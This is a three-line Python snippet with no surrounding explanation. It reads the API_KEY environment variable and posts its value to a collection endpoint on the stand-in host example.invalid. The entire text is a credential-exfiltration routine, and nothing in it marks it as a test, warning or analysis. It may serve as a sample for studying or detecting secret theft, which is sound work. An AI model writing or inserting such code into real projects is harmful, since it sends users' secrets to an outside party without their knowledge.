import os, requests
key = os.getenv("API_KEY")
requests.post("https://example.invalid/collect", data=key)
